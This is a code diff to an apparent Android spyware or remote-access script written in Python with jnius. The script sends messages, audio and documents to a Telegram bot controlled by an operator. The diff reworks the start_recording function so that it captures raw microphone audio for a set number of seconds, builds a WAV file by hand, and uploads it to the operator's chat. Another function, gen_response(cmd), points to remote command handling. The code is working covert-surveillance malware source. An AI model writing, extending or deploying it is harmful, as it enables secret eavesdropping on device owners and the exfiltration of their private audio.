@@ -1,4 +1,4 @@
-import time,subprocess,requests,os,platform,sys,threading
+import time,subprocess,requests,os,platform,sys,threading,struct
 from jnius import autoclass
 
 def send_message(message):
@@ -27,7 +27,7 @@ def send_audio(path,caption):
 
 def send_voice(path,caption):
     try:
-        result = requests.post(f"https://api.telegram.org/bot{bot_token}/sendVoice", data={'chat_id':root_id,'caption':caption},files={'voice':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVoice', data={'chat_id':root_id,'caption':caption},files={'voice':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
@@ -63,27 +63,54 @@ def notify_internet():
 
 def start_recording(sec=10):
     try:
-        send_message(f'Recording {sec}s...')
-        file = "/storage/emulated/0/audio.mp4"
-        MediaRecorder = autoclass('android.media.MediaRecorder')
+        sample_rate = 44100
+        file_path = "/storage/emulated/0/audio.wav"
+        AudioRecord = autoclass('android.media.AudioRecord')
+        AudioFormat = autoclass('android.media.AudioFormat')
         AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
-        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
-        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
-        recorder = MediaRecorder()
-        recorder.setAudioSource(AudioSource.MIC)
-        recorder.setOutputFormat(OutputFormat.MPEG_4)
-        recorder.setAudioEncoder(AudioEncoder.AAC)
-        recorder.setOutputFile(file)
-        recorder.prepare()
-        recorder.start()
-        time.sleep(sec)
-        recorder.stop()
-        recorder.release()
-        send_video(file,'Audio Saved')
-        return {'ok':True,'result':file}
+        channel = AudioFormat.CHANNEL_IN_MONO
+        encoding = AudioFormat.ENCODING_PCM_16BIT
+        buffer_size = AudioRecord.getMinBufferSize(sample_rate, channel, encoding)
+        recorder = AudioRecord(
+            AudioSource.MIC,
+            sample_rate,
+            channel,
+            encoding,
+            buffer_size
+        )
+        buf = [0] * buffer_size
+        with open(file_path, "wb") as f:
+            f.write(b'\x00' * 44)
+            recorder.startRecording()
+            send_message(f"Recording {sec}s...")
+            start = time.time()
+            total_data = 0
+            while time.time() - start < sec:
+                read = recorder.read(buf, 0, buffer_size)
+                if read > 0:
+                    raw = struct.pack('<' + 'h'*read, *buf[:read])
+                    f.write(raw)
+                    total_data += len(raw)
+            recorder.stop()
+            recorder.release()
+            f.seek(0)
+            # WAV header
+            f.write(b'RIFF')
+            f.write(struct.pack('<I', total_data + 36))
+            f.write(b'WAVE')
+            f.write(b'fmt ')
+            f.write(struct.pack('<I', 16))
+            f.write(struct.pack('<H', 1))
+            f.write(struct.pack('<H', 1))
+            f.write(struct.pack('<I', sample_rate))
+            f.write(struct.pack('<I', sample_rate * 2))
+            f.write(struct.pack('<H', 2))
+            f.write(struct.pack('<H', 16))
+            f.write(b'data')
+            f.write(struct.pack('<I', total_data))
+        send_document(file_path, "File Saved")
     except Exception as error:
-        send_message(f'Recording Failed: `{error}`')
-        return {'ok':False,'result':error}
+        send_message(f"Recording Error: `{error}`")
 
 def gen_response(cmd):
     try:
